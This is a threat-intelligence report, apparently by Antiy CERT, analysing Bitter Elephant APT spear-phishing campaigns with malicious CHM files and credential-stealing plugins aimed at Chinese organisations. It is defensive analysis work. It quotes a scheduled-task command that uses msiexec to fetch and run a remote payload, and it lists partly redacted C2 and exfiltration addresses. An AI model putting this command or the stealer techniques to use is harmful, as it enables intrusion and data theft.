Analysis of Bitter Elephant Group’s Attack Activities Targeting China in the First Half of the Year  
1 Overview Antiy CERT recently identified a series of cyber attacks targeting China's military-industrial complex, trade, and energy sectors through security incident analysis. The attacks utilized spear-phishing emails with malicious CHM attachments to lure victims. Attribution analysis revealed these activities align with historical patterns of APT group Bitter Elephant [1], showing correlations in targets, malware, and network infrastructure, representing the group’s typical attack patterns in H1 2021. Key characteristics include: Table 1-1 Attack Characteristics Event Highlights Characteristic Overview Event Summary Bitter Elephant's cyber attack activities Targets Chinese military-industrial, trade, and energy sector entities Attack Method Spear-phishing emails delivering malicious CHM files Attack Intent Intelligence theft Attack Time April 2021 Antiy CERT also tracked multiple credential-stealing plugins used by Bitter Elephant in H1 2021, exhibiting the group’s distinct TTPs. The analysis section will detail two typical plugins: asms and sthost. 2 Event Analysis 2.1 Initial Lure Analysis Attackers sent sequential spear-phishing emails with subjects like "Meeting Agenda" containing malicious CHM attachments. Example: Figure 2-1 Contents in attachment zip file Table 2-1 Sample Tags Malware Name Trojan/Script.CHM Original Filename 会议议程.chm MD5 D91B888205AC1CA80C40426B9F5A6105 Size 10.60 KB Format MS Windows HtmlHelp Data The CHM file executed obfuscated scripts creating a scheduled task "DefenderService" running every 15 minutes: %coMSPec% /c start /min msiexec /i http://***.com/***/crt.php?h=%computername%*%username% /qn /norestart The payload CERT.msi deployed downloader winupd.exe to %AppData%\Microsoft\Windows\SendTo\, fetching plugins within 30 minutes: Table 2-2 Malware List Hash Path Description 4e1cc7a2e7ba7858b2bdbcbe344410e4 ...\会议议程.zip Email attachment d91b888205ac1ca80c40426b9f5a6105 ...\会议议程.chm CHM file 6452e2c243db03ecbcacd0419ff8bebf ...\winupd.exe Downloader ef099d5fe4075132bf3812c9d5ffa8f9 ...\MtMpEnq.exe RAT 1 bd054c4f43808ef37352f36129bf0c3d ...\mtAdvanced4.exe RAT 2 ade9a4ee3acbb0e6b42fb57f118dbd6b ...\sysmgr.exe File stealer 7abcca95bc9c69d93be133f6597717c0 ...\mvrs_crsh.exe Browser credential stealer 578918166854037cdcf1bb3a06a7a4f3 ...\scvhost.exe Keylogger 2.2 Plugin Analysis RAT 1 (MtMpEnq.exe MD5: EF099D5FE4075132BF3812C9D5FFA8F9) uses C2 45.11.***.***:34318 with file management and CMD execution capabilities. Control commands include: Table 2-3 RAT 1 Commands Opcode Function 2 Delete file 18-21 File operations 38-41 File transfer 48-51 Command execution RAT 2 (mtAdvanced4.exe MD5: BD054C4F43808EF37352F36129BF0C3D) connects to 45.11.***.***:80 with similar functions. File stealer sysmgr.exe (MD5: ade9a4ee3acbb0e6b42fb57f118dbd6b) exfiltrates files with extensions .azr, .docx, .xlsx, etc. via http://***.net/UihbywscTZ/45Ugty845nv7rt.php. Browser stealer mvrs_crsh.exe (MD5: 7ABCCA95BC9C69D93BE133F6597717C0) extracts credentials from Chrome/Firefox to en-GB-4-0.txt. Keylogger scvhost.exe (MD5: 578918166854037CDCF1BB3A06A7A4F3) logs keystrokes to syslog0812AXbcW.neat using XOR 0x14 encryption, monitoring clipboard via CTRL+V detection. 3 Correlation Analysis Plugins asms.exe (MD5: B63E9710CB67F4A649A83929ED9F0322) and sthost.exe (MD5: 0159DF64E95A4BC0FC1AAFE4AA7FD3B6) share TTPs with sysmgr.exe, including: - File type targeting (.doc, .xls, .pdf) - Exclusion path lists - Anti-analysis techniques (random sleep) - Data exfiltration via HTTP - Custom encryption (Caesar cipher for system info in sthost) 4 ATT&CK Mapping The attacks map to 18 techniques across 10 ATT&CK stages: Table 4-1 ATT&CK Mapping Stage Technique Description Reconnaissance Victim org profiling Resource Development Infrastructure acquisition Initial Access Spear-phishing Execution User execution via CHM Persistence Registry Run key/Scheduled tasks Credential Access Browser credential extraction Collection Input capture/Clipboard monitoring C2 Encrypted channels Exfiltration C2 exfiltration Figure 4-1 shows complete ATT&CK mapping.